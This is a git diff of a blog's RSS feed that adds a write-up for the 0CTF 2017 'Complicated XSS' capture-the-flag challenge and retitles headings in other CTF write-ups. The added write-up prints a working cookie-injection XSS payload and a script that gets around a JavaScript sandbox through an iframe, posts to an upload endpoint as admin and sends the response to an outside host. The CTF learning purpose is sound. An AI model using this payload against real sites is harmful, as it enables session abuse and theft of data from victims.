@@ -7,11 +7,111 @@
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     <copyright>&amp;copy; &lt;a href=&#34;https://jiulongw.github.io&#34;&gt;jiulongw&lt;/a&gt; 2016</copyright>
-    <lastBuildDate>Sun, 19 Mar 2017 21:11:57 -0700</lastBuildDate>
+    <lastBuildDate>Mon, 20 Mar 2017 10:14:18 -0700</lastBuildDate>
     <atom:link href="https://jiulongw.github.io/post/index.xml" rel="self" type="application/rss+xml" />
     
     <item>
-      <title>0ctf 2017 - KoG</title>
+      <title>0CTF 2017 - Complicated XSS</title>
+      <link>https://jiulongw.github.io/post/0ctf-2017-complicated-xss/</link>
+      <pubDate>Mon, 20 Mar 2017 10:14:18 -0700</pubDate>
+      
+      <guid>https://jiulongw.github.io/post/0ctf-2017-complicated-xss/</guid>
+      <description>&lt;p&gt;Cookies Monster&amp;hellip;&lt;/p&gt;
+
+&lt;p&gt;&lt;/p&gt;
+
+&lt;h1 id=&#34;problem&#34;&gt;Problem&lt;/h1&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;Does this look familiar?&lt;br /&gt;
+&lt;a href=&#34;http://government.vip/&#34;&gt;http://government.vip/&lt;/a&gt;
+&lt;hr /&gt;
+XSS Book&lt;/p&gt;
+
+&lt;p&gt;The flag is in &lt;a href=&#34;http://admin.government.vip:8000&#34;&gt;http://admin.government.vip:8000&lt;/a&gt;&lt;br /&gt;
+Bruteforce and scanning are not needed!&lt;br /&gt;
+Admin will be hit by your payload&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h1 id=&#34;solution&#34;&gt;Solution&lt;/h1&gt;
+
+&lt;p&gt;Login to admin page with pre-populated test account, we can see there are two cookies: &lt;code&gt;username&lt;/code&gt; and &lt;code&gt;session&lt;/code&gt;, and the
+page says &amp;ldquo;only admin can upload shell&amp;rdquo;.  Seems like we need to XSS admin to upload something.  The &lt;code&gt;session&lt;/code&gt; cookie is
+an HTTP cookie that cannot be accessed by script.  The &lt;code&gt;username&lt;/code&gt; cookie however, is an XSS point.  Server reads &lt;code&gt;username&lt;/code&gt;
+cookie content and displayed it as raw HTML.&lt;/p&gt;
+
+&lt;p&gt;Now comes the tricky part: in the document header of admin page, some core component is stripped out.  Making AJAX call
+will fail since there&amp;rsquo;s no &lt;code&gt;XMLHttpRequest&lt;/code&gt;.  I also tried &lt;a href=&#34;https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API&#34;&gt;Fetch API&lt;/a&gt; which works locally but server&amp;rsquo;s browser
+doesn&amp;rsquo;t support it.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;script&amp;gt;
+//sandbox
+delete window.Function;
+delete window.eval;
+delete window.alert;
+delete window.XMLHttpRequest;
+delete window.Proxy;
+delete window.Image;
+delete window.postMessage;
+&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Poking around and I found out that the embedded &lt;code&gt;iframe&lt;/code&gt; element still have &lt;code&gt;XMLHttpRequest&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Another trick that blocked me for quite a while is that the admin page only renders upload form if &lt;code&gt;username&lt;/code&gt; cookie is
+&amp;ldquo;admin&amp;rdquo;.  So we need to reset cookie and fetch admin page again to see what parameters are needed for upload.
+Otherwise, it keeps hitting &lt;code&gt;400: bad request&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;h1&amp;gt;Hello admin&amp;lt;/h1&amp;gt;
+
+&amp;lt;p&amp;gt;Upload your shell&amp;lt;/p&amp;gt;
+&amp;lt;form action=&amp;quot;/upload&amp;quot; method=&amp;quot;post&amp;quot; enctype=&amp;quot;multipart/form-data&amp;quot;&amp;gt;
+&amp;lt;p&amp;gt;&amp;lt;input type=&amp;quot;file&amp;quot; name=&amp;quot;file&amp;quot;&amp;gt;&amp;lt;/input&amp;gt;&amp;lt;/p&amp;gt;
+&amp;lt;p&amp;gt;&amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;upload&amp;quot;&amp;gt;
+&amp;lt;/form&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Here&amp;rsquo;s the XSS payload.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;document.cookie=&amp;quot;username=&amp;lt;iframe&amp;gt;&amp;lt;/iframe&amp;gt;&amp;lt;script src=&#39;http://.../a.js&#39;&amp;gt;&amp;lt;/script&amp;gt;;path=/;domain=.government.vip&amp;quot;;
+window.location=&amp;quot;http://admin.government.vip:8000&amp;quot;;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;a.js&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;document.cookie=&amp;quot;username=admin&amp;quot;;
+
+var xhr = new frames[0].XMLHttpRequest;
+xhr.onreadystatechange = function() {
+  if (xhr.readyState === 4) {
+    var result = xhr.responseText;
+    result += &amp;quot;,&amp;quot;;
+    result += xhr.status;
+    result += &amp;quot;,&amp;quot;;
+    result += xhr.getAllResponseHeaders();
+    window.location=&amp;quot;http://.../?a=&amp;quot; + btoa(result);
+  }
+}
+
+xhr.open(&#39;POST&#39;, &#39;/upload&#39;, true);
+
+var fblob = new Blob([&amp;quot;any content here&amp;quot;]);
+var formData = new FormData();
+formData.append(&amp;quot;file&amp;quot;, fblob);
+
+xhr.send(formData);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Decoded response:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;flag{xss_is_fun_2333333},200,Server: TornadoServer/4.4.2
+Content-Length: 24
+Content-Type: text/html; charset=utf-8
+&lt;/code&gt;&lt;/pre&gt;</description>
+    </item>
+    
+    <item>
+      <title>0CTF 2017 - KoG</title>
       <link>https://jiulongw.github.io/post/0ctf-2017-kog/</link>
       <pubDate>Sun, 19 Mar 2017 21:11:57 -0700</pubDate>
       
@@ -26,6 +126,8 @@
 &lt;p&gt;King of Glory is a funny game. Our website has a list of players.&lt;br /&gt;
 &lt;a href=&#34;http://202.120.7.213:11181&#34;&gt;http://202.120.7.213:11181&lt;/a&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
+
+&lt;h1 id=&#34;solution&#34;&gt;Solution&lt;/h1&gt;
 
 &lt;p&gt;Hitting the given URL doesn&amp;rsquo;t show anything interesting, but the page source code indicating it was looking for &lt;code&gt;id&lt;/code&gt;
 parameter.  So try it with &lt;code&gt;?id=1&lt;/code&gt;, we can see it made a request to api.php with some interesting parameters.&lt;/p&gt;
@@ -259,6 +361,8 @@ and blocked the order system on Shobot.&lt;/p&gt;
 &lt;p&gt;Running on: shobot.teaser.insomnihack.ch&lt;/p&gt;
 &lt;/blockquote&gt;
 
+&lt;h1 id=&#34;solution&#34;&gt;Solution&lt;/h1&gt;
+
 &lt;p&gt;The website itself is pretty simple.  It has very simple javascript which is only used to show / hide menus.  It is a
 PHP session based cart system where you can add items to cart, validate and reset the cart, etc.  The admin page requires
 authentication which is the target of this challenge.&lt;/p&gt;
@@ -358,7 +462,9 @@ rogue AI.&lt;/p&gt;
 for a given part, you should be able to find the corresponding flag and move on to the next part.&lt;/p&gt;
 &lt;/blockquote&gt;
 
-&lt;h1 id=&#34;part-i-forensics-50-pts&#34;&gt;Part I - Forensics - 50 pts&lt;/h1&gt;
+&lt;h1 id=&#34;solution&#34;&gt;Solution&lt;/h1&gt;
+
+&lt;h2 id=&#34;part-i-forensics-50-pts&#34;&gt;Part I - Forensics - 50 pts&lt;/h2&gt;
 
 &lt;p&gt;It all begins with the pcap file.  After loading it with the favourite &lt;a href=&#34;https://www.wireshark.org/&#34;&gt;Wireshark&lt;/a&gt;, couple
 of interesting packets caught my eyes:&lt;/p&gt;
@@ -394,7 +500,7 @@ I have server&amp;rsquo;s private key.  But wait a minute, isn&amp;rsquo;t it ss
 
 &lt;p&gt;&lt;img src=&#34;https://jiulongw.github.io/img/insomnihack-2017/the-great-escape-flag-1.png&#34; alt=&#34;Part I Flag&#34; /&gt;&lt;/p&gt;
 
-&lt;h1 id=&#34;part-ii-web-200-pts&#34;&gt;Part II - Web - 200 pts&lt;/h1&gt;
+&lt;h2 id=&#34;part-ii-web-200-pts&#34;&gt;Part II - Web - 200 pts&lt;/h2&gt;
 
 &lt;p&gt;Now that the SSL packets are decrypted, we can find the file Rogue uploaded to SSC in packet #2437, as shown below.
 However, SSC is so secure that it has another level of encryption in addition to SSL.&lt;/p&gt;
